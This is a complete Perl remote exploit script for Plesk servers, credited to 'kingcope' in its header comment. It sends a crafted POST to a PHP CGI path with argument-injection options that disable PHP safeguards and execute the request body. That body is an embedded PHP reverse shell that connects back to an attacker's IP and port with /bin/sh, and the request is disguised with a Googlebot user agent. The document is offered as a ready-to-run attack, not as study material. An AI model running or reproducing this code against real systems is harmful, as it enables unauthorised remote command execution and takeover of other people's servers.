#plesk remote exploit by kingcope
#all your base belongs to me :>
use IO::Socket;
use IO::Socket::SSL;
use URI::Escape;
sub usage {
 print "usage: $0 <target> <http/https> <local_ip> <local_port>\n";exit;
}
if (!defined($ARGV[3])){usage();}
$target=$ARGV[0];
$proto=$ARGV[1];
if ($proto eq "http") {
$sock = IO::Socket::INET->new(
 PeerAddr => $ARGV[0],
 PeerPort => 80,
 Proto => 'tcp');
}elsif ($proto eq "https") {
$sock = IO::Socket::SSL->new(
 PeerAddr => $ARGV[0],
 PeerPort => 443,
 Proto => 'tcp');
}else {usage();}
$lip=$ARGV[2];
$lport=$ARGV[3];
$pwn="<?php echo \"Content-Type: text/plain\r\n\r\n\";set_time_limit (0); \$VERSION = \"1.0\"; \$ip =
'$lip';  \$port = $lport; \$chunk_size = 1400; \$write_a = null;
\$error_a = null; \$shell = '/bin/sh -i'; \$daemon =
0;\$debug = 0; if (function_exists('pcntl_fork')) { \$pid =
pcntl_fork(); if (\$pid == -1) { printit(\"ERROR: Can't fork\");
exit(1);} if (\$pid) { exit(0);} if (posix_setsid() == -1) {
printit(\"Error: Can't setsid()\"); exit(1); } \$daemon = 1;} else {
printit(\"WARNING: Failed to daemonise.  This is quite common and not
fatal.\");}chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port,
\$errno, \$errstr, 30);if (!\$sock) { printit(\"\$errstr (\$errno)\");
exit(1);} \$descriptorspec = array(0 => array(\"pipe\", \"r\"),1 =>
array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));\$process =
proc_open(\$shell, \$descriptorspec, \$pipes);if
(!is_resource(\$process)) { printit(\"ERROR: Can't spawn shell\");
exit(1);}stream_set_blocking(\$pipes[0],
0);stream_set_blocking(\$pipes[1], 0);stream_set_blocking(\$pipes[2],
0);stream_set_blocking(\$sock, 0);while (1) {    if (feof(\$sock)) {
printit(\"done.\"); break;} if
(feof(\$pipes[1])) {printit(\"done.\");break;}\$read_a = array(\$sock, \$pipes[1],
\$pipes[2]);\$num_changed_sockets = stream_select(\$read_a, \$write_a,
\$error_a, null);if (in_array(\$sock, \$read_a)) {if (\$debug)
printit(\"SOCK READ\");\$input = fread(\$sock,
\$chunk_size);if(\$debug) printit(\"SOCK:
\$input\");fwrite(\$pipes[0], \$input);}if (in_array(\$pipes[1],
\$read_a)) {if (\$debug) printit(\"STDOUT READ\");\$input =
fread(\$pipes[1], \$chunk_size);if (\$debug) printit(\"STDOUT:
\$input\");fwrite(\$sock, \$input);}if (in_array(\$pipes[2],
\$read_a)) {if (\$debug) printit(\"STDERR READ\");\$input =
fread(\$pipes[2], \$chunk_size);    if (\$debug) printit(\"STDERR:
\$input\");fwrite(\$sock,
\$input);}}fclose(\$sock);fclose(\$pipes[0]);fclose(\$pipes[1]);fclose(\$pipes[2]);proc_close(\$process);function printit (\$string) {if (!\$daemon) {print
\"\$string\n\";}}
?>";
$arguments=uri_escape("-d","\0-\377"). "+" .
 uri_escape("allow_url_include=on","\0-\377"). "+" .
 uri_escape("-d","\0-\377"). "+" .
 uri_escape("safe_mode=off","\0-\377"). "+" .
 uri_escape("-d","\0-\377"). "+" .
 uri_escape("suhosin.simulation=on","\0-\377"). "+" .
 uri_escape("-d","\0-\377"). "+" .
 uri_escape("disable_functions=\"\"","\0-\377"). "+" .
 uri_escape("-d","\0-\377"). "+" .
 uri_escape("open_basedir=none","\0-\377"). "+" .
 uri_escape("-d","\0-\377"). "+" .
 uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
 uri_escape("-n","\0-\377");
$path=uri_escape("phppath","\0-\377"). "/" . uri_escape("php","\0-\377");
print $sock "POST /$path?$arguments HTTP/1.1\r\n".
 "Host: $ARGV[0]\r\n".
 "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n".
 "Content-Type: text/plain\r\n".
 "Content-Length: ". length($pwn) ."\r\n\r\n". $pwn;
while(<$sock>){print $_;};